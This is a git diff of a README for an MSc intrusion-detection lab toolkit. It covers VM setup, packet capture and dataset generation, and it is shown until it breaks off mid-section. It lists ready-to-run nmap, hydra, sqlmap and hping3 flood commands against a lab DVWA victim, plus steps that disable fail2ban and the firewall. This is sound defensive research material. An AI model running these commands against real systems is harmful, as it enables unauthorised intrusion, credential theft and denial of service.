@@ -1,125 +1,106 @@
 # IDS Packet Capture & Analysis Suite
 
-A robust, packet-level data collection and verification pipeline for the MSc dissertation:
+A packet-level data collection pipeline for the MSc dissertation:
 **"A Packet-Level Intrusion Detection System — Lab Setup to Dataset Generation to Automated Threat Verification"**
 
-This toolkit provides an end-to-end environment for executing network attacks, capturing packets reliably under heavy load, verifying the presence of attack signatures, and extracting Machine Learning-ready flow features — from a blank pair of VMs all the way to a labelled dataset and a Suricata comparison.
+## 1. What This Project Does
+
+You run two virtual machines: a **Victim** (Ubuntu, running a deliberately vulnerable website) and an **Attacker** (Kali Linux). You launch real attacks — port scans, brute-force logins, SQL injection, denial-of-service floods — from the Attacker against the Victim. This project captures every packet of that traffic on the Victim, proves each attack actually happened, and turns the raw packets into a labelled dataset you can feed into a machine learning model.
+
+Three design choices worth knowing before you start, because they explain some of the setup steps below:
+
+- **Packets are captured with `dumpcap`** (Wireshark's capture engine), not a Python script, because Python is too slow to keep up with a real flood attack without dropping packets.
+- **Flow features are computed with `tshark`**, not the CICFlowMeter tool most IDS papers use, because CICFlowMeter is unmaintained and hard to build. This project replicates its feature set in Python you can actually read and defend.
+- **Every attack is automatically verified** — the pipeline counts SYN packets, scanned ports, HTTP requests, etc. in each capture and checks they match what that attack should look like, so you have evidence the attack really happened, not just a filename that says so.
+
+## 2. What You Need Before Starting
+
+- VMware (Workstation or Player) installed on your computer (the **host**).
+- Two virtual machines already created:
+  - **Victim**: Ubuntu Server or Desktop.
+  - **Attacker**: Kali Linux.
+- Both VMs can currently reach the internet. (You will lock this down to an isolated, internet-free network later — not yet. Doing it too early is the single most common setup mistake: several steps below need to download things, and an isolated network has no route to the internet.)
+
+Two IP addresses are used as examples throughout this guide:
+- Victim: `10.0.0.20`
+- Attacker (Kali): `10.0.0.10`
+
+If you use different addresses, substitute your own everywhere you see these.
 
 ---
 
-## 1. Why This Architecture? (Design Decisions)
+## 3. Setting Up the Victim VM
 
-When building a dataset for Intrusion Detection System (IDS) research, data integrity and reproducibility are paramount. This suite makes several specific design choices to ensure thesis-grade results:
+Do these steps **in this exact order**. Steps 3.1–3.6 need internet access; step 3.7 removes it. If you do 3.7 first, every later step will fail with confusing connection errors.
 
-### Why `dumpcap` instead of Python sniffers (Scapy / PyShark)?
-Python-based packet sniffers are notoriously slow. During a high-volume attack (like an hping3 SYN flood), Python sniffers will silently drop thousands of packets, corrupting your dataset.
-**The Solution:** This toolkit wraps `dumpcap` (the highly optimized C-based engine behind Wireshark) in a Python subprocess, logging exact start/stop UTC timestamps to `labels.log` for precise ground-truth labelling.
-
-### Why custom flow extraction instead of CICFlowMeter?
-While CICIDS2017 and CICFlowMeter are industry standards, the original Java-based CICFlowMeter is difficult to compile, unmaintained, and opaque.
-**The Solution:** The `extract_flows.py` module replicates the core CICFlowMeter 5-tuple bidirectional feature extraction (Duration, IAT, TCP Flags, PPS, BPS) using `tshark`'s `-T fields` parser and Python's `pandas`. This provides absolute transparency into how your ML features are calculated, which is critical for defending your methodology in a dissertation defense.
-
-### Why the Automated Verification Module?
-Examiners will not just take your word that an attack succeeded. You must prove the malicious traffic is present in the dataset.
-**The Solution:** The `verify.py` and `verify_report.py` modules automatically run targeted `tshark` queries against your generated `.pcap` files, counting SYN-only packets, unique destination ports, SSH attempts, HTTP requests, and SQL injection keywords, and output a Markdown table summarizing the empirical evidence of each attack.
-
-### High-Performance & Memory-Optimized Pipeline
-Working with multi-gigabyte PCAPs on resource-constrained VMs typically causes `MemoryError` crashes or takes days to process.
-**The Solution:**
-- **Parallel Processing:** Flow extraction and verification are multi-threaded, utilizing all available CPU cores via `ThreadPoolExecutor`.
-- **Stream Processing:** `tshark` output is streamed directly into Python memory line-by-line rather than loaded in bulk, keeping the RAM footprint flat regardless of PCAP size.
-- **Single-Pass Verification:** Verification metrics are parsed in a single sweep of the PCAP file, rather than running separate filters sequentially.
-
----
-
-## 2. Full Environment Setup (From Blank VMs)
-
-This software runs on a **Victim VM** (Ubuntu, hosting DVWA) while attacks are launched from an **Attacker VM** (Kali). This section assumes both are freshly installed on VMware and walks through everything needed to reach a working pipeline — this is hard-won, empirically verified setup knowledge, not a generic guide.
-
-### 2.1 Network the two VMs together
-
-Both VMs need to see each other's traffic directly, with zero internet noise polluting your BENIGN capture.
-
-In VMware: **Edit → Virtual Network Editor** (or per-VM: right-click VM → Settings → Network Adapter), and set **both** VMs' adapters to the same **Host-only** network (or a custom VMnet/LAN Segment shared only between the two). Avoid NAT or Bridged for the actual lab network — those put you on a network with other traffic and possibly real internet access. (You will need to *temporarily* switch to NAT for installation steps that need internet — see 2.7.)
-
-Give each VM a **static IP** so it never changes mid-project (DHCP renewal breaking `--attacker-ip`/`--victim-ip` is a common self-inflicted bug).
-
-**Ubuntu (Victim)** — edit netplan (find your file with `ls /etc/netplan/`, typically `00-installer-config.yaml` from the subiquity installer):
-```bash
-sudo nano /etc/netplan/00-installer-config.yaml
-```
-```yaml
-# This is the network config written by 'subiquity'
-network:
-  ethernets:
-    ens33:
-      addresses: [10.0.0.20/24]
-      dhcp4: false
-      dhcp6: false
-      match:
-        macaddress: 00:0c:29:xx:xx:xx   # keep your actual MAC here
-      set-name: ens33
-  version: 2
-```
-```bash
-sudo netplan apply
-ip a show ens33   # confirm it shows 10.0.0.20/24
-```
-No `gateway4`/`nameservers` on purpose — this VM only needs to talk to Kali on the isolated segment; adding a gateway risks routing traffic out to the internet, which is exactly what you don't want polluting BENIGN captures. If `netplan apply` warns about file permissions, `sudo chmod 600 <file>` and retry. If it fails with `systemd-networkd is not running` / `dbus-org.freedesktop.network1.service not found`, first just check `ip a` — the fallback restart often still worked despite the noisy warning; if not, `sudo apt install -y apparmor-utils` isn't relevant here, instead try `sudo systemctl unmask systemd-networkd && sudo systemctl enable --now systemd-networkd && sudo netplan apply` , or if this VM actually uses NetworkManager instead, add `renderer: NetworkManager` to the YAML.
-
-**Kali (Attacker)** — Kali doesn't use netplan, it uses NetworkManager directly:
-```bash
-ip a                      # confirm interface name, e.g. eth0
-nmcli connection show     # find the connection name, usually "Wired connection 1"
-sudo nmcli connection modify "Wired connection 1" ipv4.addresses 10.0.0.10/24
-sudo nmcli connection modify "Wired connection 1" ipv4.method manual
-sudo nmcli connection down "Wired connection 1" && sudo nmcli connection up "Wired connection 1"
-```
-
-Verify: `ping 10.0.0.20` from Kali and `ping 10.0.0.10` from Ubuntu should both succeed.
-
-### 2.2 Victim VM — base system setup
+### 3.1 Install the required packages
 
 ```bash
 sudo apt update && sudo apt upgrade -y
-sudo apt install -y tshark wireshark-common tcpdump python3-pip python3-venv git openssh-server apache2 mysql-server php php-mysqli php-gd libapache2-mod-php
+sudo apt install -y tshark wireshark-common tcpdump python3-pip python3-venv git openssh-server docker.io
 ```
-The `wireshark-common` non-superuser prompt doesn't matter much here since the pipeline always runs under `sudo` anyway — either answer is fine.
 
-**SSH brute-force target account** (username is hardcoded as `labuser` in `ATTACK_PHASES`, must match exactly):
+- `tshark`/`wireshark-common`/`tcpdump` — the packet capture and analysis engines this project wraps.
+- `python3-venv`/`python3-pip` — for running this project's Python code in an isolated environment.
+- `git` — to download this project's code (or skip this if you'll transfer the files another way).
+- `openssh-server` — Ubuntu Desktop doesn't include this by default, and one of the attacks (SSH brute force) needs a running SSH server to attack.
+- `docker.io` — used in the next step to run the practice website with almost no manual configuration.
+
+If `wireshark-common` asks *"Should non-superusers be able to capture packets?"* — either answer is fine; every command in this project runs with `sudo` anyway.
+
+Start Docker:
+```bash
+sudo systemctl enable --now docker
+```
+
+### 3.2 Start the practice website (DVWA)
+
+DVWA (Damn Vulnerable Web Application) is the deliberately insecure website the attacks target. Running it as a Docker container is far simpler than installing it manually — everything it needs (web server, PHP, database) is bundled inside the container.
+
+```bash
+sudo docker run -d --name dvwa -p 80:80 --restart unless-stopped vulnerables/web-dvwa
+```
+
+Now open a browser (on the Victim VM, or from your host if networking allows it at this point) and go to the Victim's current IP address:
+
+1. Visit `http://<victim-ip>/setup.php` and click **Create / Reset Database**.
+2. Log in with the default account: username `admin`, password `password`.
+3. In the navigation menu, click **DVWA Security** and set it to **Low**. Every attack command in this guide assumes this setting.
+
+If you ever need to start over: `sudo docker rm -f dvwa`, then repeat the `docker run` command above.
+
+### 3.3 Create the account the SSH attack will target
+
+One of the attacks is a brute-force SSH login attempt. It needs a real account to attack, with a password you know:
+
 ```bash
 sudo useradd -m -s /bin/bash labuser
-sudo passwd labuser              # type a password interactively -- remember it, it goes in Kali's wordlist later
-sudo grep -i passwordauthentication /etc/ssh/sshd_config   # must read 'yes'; edit + restart ssh if not
-sudo systemctl restart ssh
+sudo passwd labuser
 ```
 
-**Disable fail2ban/ufw for the lab** — fail2ban will ban Kali's IP mid-brute-force and make every SSH attack look like it failed regardless of password correctness:
+`sudo passwd labuser` will ask you to type a password twice. **Write it down** — you'll need to put this exact password into a file on the Attacker VM later, or the attack will run but never actually succeed.
+
+The username must be exactly `labuser` — it's hardcoded into this project's attack commands.
+
+Confirm SSH will accept password logins:
 ```bash
-sudo systemctl stop fail2ban 2>/dev/null; sudo systemctl disable fail2ban 2>/dev/null
+sudo grep -i passwordauthentication /etc/ssh/sshd_config
+```
+This should print a line ending in `yes`. If it says `no`, open the file with `sudo nano /etc/ssh/sshd_config`, change that line to `PasswordAuthentication yes`, save, and run `sudo systemctl restart ssh`.
+
+### 3.4 Turn off things that would block the attacks
+
+Two Ubuntu security features exist specifically to stop the kind of traffic you're about to generate on purpose. Turn them off for this lab machine:
+
+```bash
+sudo systemctl stop fail2ban 2>/dev/null
+sudo systemctl disable fail2ban 2>/dev/null
 sudo ufw disable
 ```
 
-### 2.3 Victim VM — DVWA via Docker
+`fail2ban` automatically bans an IP address after repeated failed login attempts — which is exactly what the SSH brute-force attack does, so without this it will ban the Attacker VM partway through and the attack will look like it failed even when the password was correct.
 
-Manually installing DVWA (git clone + Apache + MySQL config) works too, but Docker is far less fiddly and is what this project actually uses:
-```bash
-sudo apt install -y docker.io
-sudo systemctl enable --now docker
-sudo systemctl stop apache2 2>/dev/null; sudo systemctl disable apache2 2>/dev/null   # free up port 80 if it's running
-sudo docker run -d --name dvwa -p 80:80 --restart unless-stopped vulnerables/web-dvwa
-```
-This image bundles Apache + PHP + MySQL internally — no separate database config needed — and serves DVWA at web root (`/`), matching every attack command in this doc (`/vulnerabilities/brute/`, `/vulnerabilities/sqli/`).
-
-Then in a browser:
-1. Visit `http://10.0.0.20/setup.php` → **Create / Reset Database**.
-2. Log in with `admin` / `password`.
-3. Set **DVWA Security** to **Low**.
-4. This is also where you grab the current `PHPSESSID` cookie (browser dev tools → Application/Storage → Cookies) whenever you get to WebBruteForce/SQLInjection — it rotates on every new login, so grab it fresh each time, right before you need it.
-
-To reset a broken container: `sudo docker rm -f dvwa`, then re-run the `docker run` command above.
-
-### 2.4 Victim VM — get the pipeline code and Python deps
+### 3.5 Get this project's code and set up Python
 
 ```bash
 git clone https://github.com/ephraimphrase/ids_lab.git ~/ids_lab
@@ -129,17 +110,90 @@ source venv/bin/activate
 pip install pandas
 ```
 
-**Important — `sudo` and venvs don't mix automatically.** `sudo python3 ...` starts a fresh process with a reset `PATH`, so it silently uses the *system* Python (no `pandas`), not your activated venv, even though your prompt still shows `(venv)`. Always invoke the venv's interpreter by path when using `sudo`:
+If GitHub isn't reachable on your network, transfer the project files to the VM some other way (a USB drive, a file share, a different download mirror) — everything after this step works the same regardless of how the files got there.
+
+**One important thing to remember for the rest of this guide**: this project's scripts need `sudo` (root) to capture packets, but `sudo` starts a completely fresh process that does **not** know about the Python environment you just activated — even though your terminal prompt still shows `(venv)`. If you run `sudo python3 run_experiment.py`, it will fail with `ModuleNotFoundError: No module named 'pandas'`, because it's silently using a different, plain Python install instead of the one you just set up.
+
+The fix is to always tell `sudo` exactly which Python to use, by its full path inside the project folder:
+
 ```bash
 sudo venv/bin/python3 run_experiment.py ...
 ```
-not `sudo python3 run_experiment.py ...`.
 
-If GitHub is blocked on your network (see §2.7 below for how to diagnose that), transfer the code some other way (a mirror, a direct file transfer, a temporary hotspot) — the rest of this doc doesn't depend on how the files got there.
+Every command in this guide that runs `run_experiment.py` uses this pattern. Don't shorten it to `sudo python3 run_experiment.py` — it will run, but silently using the wrong Python.
 
-### 2.5 Kali VM — wordlist
+### 3.6 Install Suricata
 
-Build `/tmp/pass.txt`, containing the **real** passwords for both `labuser` (SSH) and DVWA's `admin` account (default `password` unless you changed it):
+Suricata is a separate, real intrusion detection tool. You'll run it at the very end, after your dataset exists, to compare its results against your own. Install it now, while you still have internet:
+
+```bash
+sudo apt install -y suricata
+sudo suricata-update
+```
+
+The second command downloads a set of detection rules and needs internet access on its own, separate from the `apt install`.
+
+### 3.7 Now, lock down the network
+
+Everything above needed internet access. Nothing from this point forward does. This is the step that isolates the Victim and Attacker VMs from each other and from the outside world, and gives the Victim a fixed IP address that won't change.
+
+**In VMware** (on your host machine, not inside the VM): open **Edit → Virtual Network Editor**, or right-click the VM and go to **Settings → Network Adapter**, and set the adapter to **Host-only** (or a custom network shared only between the Victim and Attacker VMs). Do this for both VMs. Avoid NAT or Bridged for this — those give the VM a route back to the real internet, which will pollute your "normal traffic" capture later with random background noise.
+
+**Now set a fixed IP address inside the Victim VM.** Find your netplan configuration file — it's usually named `00-installer-config.yaml`:
+```bash
+ls /etc/netplan/
+sudo nano /etc/netplan/00-installer-config.yaml
+```
+
+Replace its contents with (keep your interface's real MAC address, shown by `ip a`, in place of the example one below):
+```yaml
+network:
+  ethernets:
+    ens33:
+      addresses: [10.0.0.20/24]
+      dhcp4: false
+      dhcp6: false
+      match:
+        macaddress: 00:0c:29:xx:xx:xx
+      set-name: ens33
+  version: 2
+```
+
+Apply it and confirm:
+```bash
+sudo netplan apply
+ip a show ens33
+```
+You should see `10.0.0.20/24` in the output. There is deliberately no internet gateway in this configuration — you no longer need one, and having one risks leaking outside traffic into your captures.
+
+If `netplan apply` prints a permissions warning, run `sudo chmod 600 /etc/netplan/00-installer-config.yaml` and try again.
+
+---
+
+## 4. Setting Up the Attacker (Kali) VM
+
+Kali needs no package installs — `nmap`, `hydra`, `sqlmap`, and `hping3` are already included. So there's no internet-access ordering concern here; do these two steps in either order.
+
+### 4.1 Set a fixed IP address
+
+Kali doesn't use netplan — it uses a tool called NetworkManager instead.
+
+```bash
+ip a
+nmcli connection show
+```
+The second command lists your active network connection's name (commonly `Wired connection 1`). Then:
+```bash
+sudo nmcli connection modify "Wired connection 1" ipv4.addresses 10.0.0.10/24
+sudo nmcli connection modify "Wired connection 1" ipv4.method manual
+sudo nmcli connection down "Wired connection 1" && sudo nmcli connection up "Wired connection 1"
+```
+Confirm: `ip a` should now show `10.0.0.10/24`.
+
+### 4.2 Create the password list
+
+The brute-force attacks need a file listing candidate passwords, including the real ones, or they'll generate traffic but never actually succeed:
+
 ```bash
 cat > /tmp/pass.txt << 'EOF'
 123456
@@ -148,81 +202,83 @@ admin
 YOUR_ACTUAL_LABUSER_SSH_PASSWORD
 EOF
 ```
-Put the real password near the top — both `SSHBruteForce` (120s) and `WebBruteForce` (90s default) windows are short, and a long wordlist may never reach the correct password in time. `nmap`, `hydra`, `sqlmap`, `hping3` all ship with Kali by default.
+Replace the last line with the real password you set for `labuser` back in step 3.3. Put it near the top of the list — the SSH and web brute-force attacks only run for a short time, and a long list might not reach the correct password before time runs out.
 
-### 2.6 Victim VM — Suricata (for the comparison step at the end)
+---
 
+## 5. Fixing Three Known VM Quirks
+
+These three issues are specific to running this kind of packet-capture project inside VMware and Ubuntu. They don't always happen, but when they do, they all look the same from the outside — "0 bytes captured" or "permission denied" — so it's worth fixing all three now rather than debugging them one at a time later.
+
+### 5.1 VMware blocks "promiscuous mode"
+
+**Symptom**: a popup saying *"The virtual machine's operating system has attempted to enable promiscuous mode on Ethernet0. This is not allowed for security reasons."*
+
+This is VMware itself (on the host) refusing a security-sensitive request. Fix it on the **host machine**, not inside the VM:
 ```bash
-sudo apt install -y suricata
-sudo suricata-update
-```
-Both steps need internet — see §2.7. Check `HOME_NET` in `/etc/suricata/suricata.yaml` covers your lab subnet (the default `10.0.0.0/8` already includes `10.0.0.0/24`, so usually no change needed).
-
-### 2.7 Getting internet access for the install steps above
-
-The isolated Host-only network from §2.1 has no route to the internet, which several install steps above need. Handle it with a temporary toggle:
-
-1. VM → Settings → Network Adapter → switch to **NAT** → OK.
-2. `sudo netplan apply` won't get you a NAT address if your netplan file is still pinned static — temporarily edit it back to `dhcp4: true` (remove the `addresses:` line), `sudo netplan apply`, confirm `ip a` shows a real NAT-range address (not `169.254.x.x`, which means no lease was obtained at all — modern Ubuntu doesn't ship `dhclient` anymore, netplan/`systemd-networkd` have DHCP built in).
-3. Run your `apt`/`git`/`docker pull`/`suricata-update` steps.
-4. Switch the adapter back to Host-only, restore the static netplan config from §2.1, `sudo netplan apply`, re-confirm `ping 10.0.0.10` still works.
-
-**If a specific site (commonly GitHub) times out on port 443/80 while other sites work fine** (test with `curl -v https://<site> --max-time 10` — a `Connection timed out` on the specific IP, not a DNS failure, is the tell), that's not a VM problem — it's the *host network* (router/ISP-level filtering, or a security suite) blocking that one destination. Confirm by testing the same URL from the **host machine's own browser**; if it's blocked there too, it's not fixable from inside the VM. Router "Advanced Security"/parental-control features sometimes flag GitHub specifically since it hosts security tooling. A mobile hotspot or VPN sidesteps it.
-
-### 2.8 Known first-boot environment issues to fix proactively
-
-These three showed up, in this order, on a freshly rebuilt VM — fixing them now saves the exact same debugging loop later. All three manifest as some form of "0 bytes captured" or "permission denied," which is why it's worth doing this checklist *before* your first real run rather than chasing it attack-by-attack.
-
-**A. VMware promiscuous-mode block** (host-side, not the guest) — shows as a VMware popup: *"The virtual machine's operating system has attempted to enable promiscuous mode on Ethernet0. This is not allowed for security reasons."* On the **host**:
-```bash
-ls -la /dev/vmnet*   # confirm they're crw------- (root-only) -- that's the cause
+ls -la /dev/vmnet*
 sudo chmod a+rw /dev/vmnet0 /dev/vmnet1 /dev/vmnet8
 ```
-Then **fully power off** the Victim VM (guest reboot alone won't re-request it) and power it back on. Make it permanent so a host reboot doesn't undo it:
+Then fully power off the Victim VM (not just restart it inside the guest) and power it back on.
+
+This resets the next time you restart your host computer. Make it permanent:
 ```bash
 echo 'KERNEL=="vmnet[0-9]*", MODE="0666"' | sudo tee /etc/udev/rules.d/99-vmware-vmnet.rules
 sudo udevadm control --reload-rules && sudo udevadm trigger
 ```
-In practice this rarely explains 0-byte captures on its own — this project only captures unicast traffic already addressed to the Victim's own interface, which doesn't strictly need promiscuous mode — but it's cheap to fix and removes the variable.
 
-**B. `dumpcap` write-permission chain** (Victim VM) — shows as `dumpcap: The file to which the capture would be saved ("...") could not be opened: Permission denied` when *writing* a new pcap. Root cause: `dumpcap` has Linux file capabilities set (`getcap /usr/bin/dumpcap` → `cap_net_raw,cap_net_admin=eip`), and per POSIX capability-exec rules that means it runs as EUID 0 **without** `CAP_DAC_OVERRIDE` even under `sudo` — so it's subject to normal permission bits just like any non-owning user. Two things need fixing, both one-time:
+### 5.2 A file permission issue blocks saving captures
+
+**Symptom**: `dumpcap: The file to which the capture would be saved ("...") could not be opened: Permission denied.`
+
+Two commands fix this, run once inside the Victim VM:
 ```bash
-sudo chmod 777 ~/captures                 # dumpcap's own default file mode is 600; chown alone never touches mode bits
-sudo chmod o+x /home/$(whoami)            # Ubuntu often defaults new home dirs to 750 -- "other" can't even traverse in to reach ~/captures otherwise
+mkdir -p ~/captures
+sudo chmod 777 ~/captures
+sudo chmod o+x /home/$(whoami)
 ```
-`run_experiment.py` now `chmod`s `--outdir` back to `777` automatically at the end of every run (alongside handing ownership back to you), so once this is done once, it should not recur for that directory — but a fresh `~/captures` on a rebuilt VM, or a different `--outdir`, needs it again.
 
-**C. AppArmor confining `dumpcap`/`tshark`** — shows as `tshark: You don't have permission to read the file`, alongside the tell-tale `Running as user "root" and group "root". This could be dangerous.` line, when *reading* an existing pcap (as opposed to B's write-side failure). **Don't test this with `sudo systemctl stop apparmor`** — that stops the systemd unit but not profiles already loaded into the kernel, giving a false "it's not AppArmor" reading. Confirm properly first:
+Why this happens: `dumpcap` runs with special limited permissions even when started with `sudo` — it isn't quite "full root" in the way you'd expect. So it needs the capture folder, and every folder above it, to explicitly allow access, rather than relying on `sudo` to override normal file permission rules. This project's own scripts fix the `captures` folder's permissions automatically after each run, but a brand-new folder (or your home folder's own default permissions) still needs this done once by hand.
+
+### 5.3 AppArmor blocks reading captures
+
+**Symptom**: `tshark: You don't have permission to read the file "..."`, together with a line saying `Running as user "root" and group "root". This could be dangerous.`
+
+This is a different problem from 5.2 — it happens when *reading* an existing capture, not when *writing* a new one. It's caused by AppArmor, a Linux security tool that can restrict which files a program is allowed to touch, separately from normal file permissions.
+
+Check whether it's actually active:
 ```bash
 sudo apt install -y apparmor-utils
-sudo aa-status   # look for tshark / tshark//dumpcap specifically under "enforce mode" vs "complain mode"
+sudo aa-status
 ```
-If it's enforcing, target the profile *file* directly (the profile is often registered as a `tshark//dumpcap` child hat, not a standalone `/usr/bin/dumpcap` entry, which trips up naming-by-path):
+Look through the output for `tshark` — it will be listed under either "profiles are in enforce mode" (this is blocking you) or "profiles are in complain mode" (this is not the problem).
+
+If it's enforcing, relax it:
 ```bash
+ls /etc/apparmor.d/ | grep -i tshark
 sudo aa-complain /etc/apparmor.d/usr.bin.tshark
 ```
-Worth knowing: in one full debugging session on this project, AppArmor was suspected but ultimately *not* the actual cause — `dmesg | grep -i apparmor` showed zero `DENIED` entries for `tshark`/`dumpcap` the whole time, and the real fix was B above. Check `dmesg` for an actual `apparmor="DENIED" ... comm="dumpcap"` line before spending time here; don't assume AppArmor just because the error message pattern looks similar to a known AppArmor case.
-
-### 2.9 Final pre-flight checklist
-
-- [ ] `ping` works both directions, no internet leakage on this network segment
-- [ ] `http://10.0.0.20/` loads DVWA's login page from a browser; DVWA Security = **Low**
-- [ ] `ssh labuser@10.0.0.20` succeeds manually with the password that's in Kali's `/tmp/pass.txt`
-- [ ] `fail2ban` stopped, `ufw` disabled on the Victim
-- [ ] §2.8's three environment fixes applied
-- [ ] `sudo venv/bin/python3 run_experiment.py` (no `--interface`) lists your real interface name
+(Use the exact filename the `ls` command shows you, in case it's different.)
 
 ---
 
-## 3. Running the Pipeline (How to make it work)
+## 6. Checking Everything Before You Begin
 
-The `run_experiment.py` orchestrator script guides you through the 4 core phases of the dataset generation process.
+Go through this list before running your first real attack. Every item should be true:
 
-### Standard Execution (The Golden Path)
+- [ ] `ping 10.0.0.20` from Kali works, and `ping 10.0.0.10` from the Victim works.
+- [ ] A browser on the Victim can load `http://10.0.0.20/login.php` (DVWA's login page).
+- [ ] DVWA's Security level is set to **Low**.
+- [ ] From Kali, `ssh labuser@10.0.0.20` logs in successfully using the password you wrote down.
+- [ ] `fail2ban` is stopped and `ufw` is disabled on the Victim.
+- [ ] The three fixes in Section 5 have been applied.
+- [ ] `/tmp/pass.txt` on Kali contains the real `labuser` password.
 
-*(**Interface name**: `enp0s3` for VirtualBox, `ens33` for VMware, `eth0` on bare metal — `ip a` to check.)*
+---
 
-*(**Filter**: use the **Victim's** IP, not the Attacker's. `DDoSSYNFlood`'s `--rand-source` spoofs the source IP on every packet, so `"host <attacker_ip>"` matches nothing during that phase and silently produces a 0-byte capture — `"host <victim_ip>"` matches every phase correctly since all attack traffic is destined to the Victim regardless of what source IP it claims. This doesn't affect labelling, which has its own independent victim-IP fallback — see §4.)*
+## 7. Running the Full Pipeline
+
+On the Victim VM, this one command runs the entire process — generating normal traffic, running every attack, verifying it, and building the final dataset:
 
 ```bash
 sudo venv/bin/python3 run_experiment.py \
@@ -233,156 +289,69 @@ sudo venv/bin/python3 run_experiment.py \
     --outdir /home/ubuntu/captures
 ```
 
-The script pauses and prompts you at each step. When prompted, switch to Kali, run the relevant attack, and press ENTER on the Victim once it finishes. Precise UTC timestamps go to `labels.log` for ground-truth labelling.
+A few things about this command worth understanding, not just copying:
 
-### Manually Running the Attacks from Kali
+- **`--interface`** is the network adapter name. VMware usually calls it `ens33`; VirtualBox usually calls it `enp0s3`. Run `ip a` on the Victim if you're not sure, or run the command above without `--interface` at all — it will print every available interface name and stop, instead of guessing wrong.
+- **`--extra-filter "host 10.0.0.20"`** tells the capture tool to record only traffic involving the Victim's own IP address. Use the **Victim's** IP here, not the Attacker's — one of the attacks (the DDoS flood) deliberately fakes its source address, so filtering by the Attacker's IP would miss it entirely, while filtering by the Victim always works, since every attack is, by definition, aimed at the Victim.
 
-In the default (non-`--auto`) mode, `run_experiment.py` never touches Kali at all — it only manages the capture on the Victim side. At each attack phase it prints:
-```
-Attack: PortScan  (nmap SYN + TCP connect + version scans)
-  Start 'PortScan' capture? [ENTER=yes / skip]:
-  [Capture running]  Run 'nmap SYN + TCP connect + version scans' from Kali now.
-  Press ENTER when attack is complete:
-```
-That's your cue to switch to Kali and run the matching command, then switch back and press ENTER once it's genuinely finished (watch for the Kali shell prompt to return, not just the output slowing down — `nmap -sV` in particular keeps working quietly after the visible scan output looks done).
+The script will pause at several points and print an instruction telling you exactly what to do next — usually "switch to Kali and run this attack." Section 8 below lists the exact command for each one.
+
+**Don't press ENTER to move on until the attack command has genuinely finished** on Kali — watch for the Kali terminal prompt to come back, not just for the on-screen output to slow down. Some tools (especially `nmap`'s version-detection scan) keep working quietly for a while after the visible output looks finished.
+
+---
+
+## 8. The Attack Commands
+
+Run these on **Kali**, one at a time, only when the Victim's terminal tells you to (Section 7).
 
 | Attack | Command to run on Kali |
 |---|---|
-| **PortScan** | `sudo nmap -sS -p 1-1024 10.0.0.20 && nmap -sT -p 1-1000 10.0.0.20 && sudo nmap -sV 10.0.0.20` |
-| **SSHBruteForce** | `hydra -l labuser -P /tmp/pass.txt ssh://10.0.0.20` |
-| **WebBruteForce** | `hydra 10.0.0.20 http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=PASTE_COOKIE_HERE; security=low:Username and/or password incorrect' -l admin -P /tmp/pass.txt` |
-| **SQLInjection** | `sqlmap -u 'http://10.0.0.20/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=PASTE_COOKIE_HERE; security=low' --batch --dbs` |
-| **DoSSYNFlood** | `sudo timeout -s INT 2 hping3 -S --flood -p 80 10.0.0.20` |
-| **DoSUDPFlood** | `sudo timeout -s INT 2 hping3 --udp --flood -p 80 10.0.0.20` |
-| **DDoSSYNFlood** | `sudo bash -c 'timeout -s INT 2 hping3 -S --flood --rand-source -p 80 10.0.0.20 & timeout -s INT 2 hping3 -S --flood --rand-source -p 443 10.0.0.20 & timeout -s INT 2 hping3 -S --flood --rand-source -p 22 10.0.0.20 & wait'` |
+| PortScan | `sudo nmap -sS -p 1-1024 10.0.0.20 && nmap -sT -p 1-1000 10.0.0.20 && sudo nmap -sV 10.0.0.20` |
+| SSHBruteForce | `hydra -l labuser -P /tmp/pass.txt ssh://10.0.0.20` |
+| WebBruteForce | `hydra 10.0.0.20 http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=PASTE_COOKIE_HERE; security=low:Username and/or password incorrect' -l admin -P /tmp/pass.txt` |
+| SQLInjection | `sqlmap -u 'http://10.0.0.20/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=PASTE_COOKIE_HERE; security=low' --batch --dbs` |
+| DoSSYNFlood | `sudo timeout -s INT 2 hping3 -S --flood -p 80 10.0.0.20` |
+| DoSUDPFlood | `sudo timeout -s INT 2 hping3 --udp --flood -p 80 10.0.0.20` |
+| DDoSSYNFlood | `sudo bash -c 'timeout -s INT 2 hping3 -S --flood --rand-source -p 80 10.0.0.20 & timeout -s INT 2 hping3 -S --flood --rand-source -p 443 10.0.0.20 & timeout -s INT 2 hping3 -S --flood --rand-source -p 22 10.0.0.20 & wait'` |
 
-Notes on the table above:
-- **Fresh `PHPSESSID` every time** — grab it right before WebBruteForce and again right before SQLInjection (log into DVWA, dev tools → cookies). A stale one causes DVWA to redirect every request to the login page, which makes hydra/sqlmap look like they're 100% succeeding (every attempt "succeeds" because the failure string never appears) while actually testing nothing.
-- **DDoSSYNFlood is wrapped in a single `sudo bash -c '...'`**, not three separate `sudo ... &` commands — backgrounding three separate `sudo` calls simultaneously means each needs its own password prompt but none can actually read your input, so they all suspend on "tty input." A single outer `sudo` avoids this entirely.
-- **`timeout -s INT 2`, not `-c <count>`** — `hping3 --flood` silently ignores `-c` (packet count) entirely; flood mode strips out that bookkeeping for maximum raw speed and never self-terminates on its own. Bounding it by *time* instead is the only way to make it stop automatically. `-s INT` matches Ctrl+C's signal so `hping3` still prints its clean summary stats instead of being abruptly killed.
+Notes:
 
-**Before you start on Kali**, make sure `/tmp/pass.txt` exists with real passwords (§2.5) and you're logged into DVWA with Security = Low in a browser (for cookie-grabbing).
-
-### Automated Execution
-
-`--auto` mode skips the manual Kali step by running each phase's attack command as a **local subprocess on whichever machine is running `run_experiment.py`** — it does not SSH anywhere, despite the docstring mentioning SSH:
-```bash
-sudo venv/bin/python3 run_experiment.py \
-    --interface ens33 \
-    --attacker-ip 10.0.0.10 \
-    --victim-ip 10.0.0.20 \
-    --extra-filter "host 10.0.0.20" \
-    --auto \
-    --phpsessid "your_dvwa_cookie"
-```
-For this to actually reproduce the two-VM design, `nmap`/`hydra`/`sqlmap`/`hping3` would need installing **on the Victim itself**, and the traffic would be self-targeted rather than arriving from a distinct attacker IP — which changes what your capture proves. Treat `--auto` as a smoke-test convenience, not how you generate your real dataset; use interactive mode with a real Kali VM for that.
-
-### Standalone Targeted Captures
-
-For a single event instead of the whole pipeline:
-
-```bash
-# Just a ping
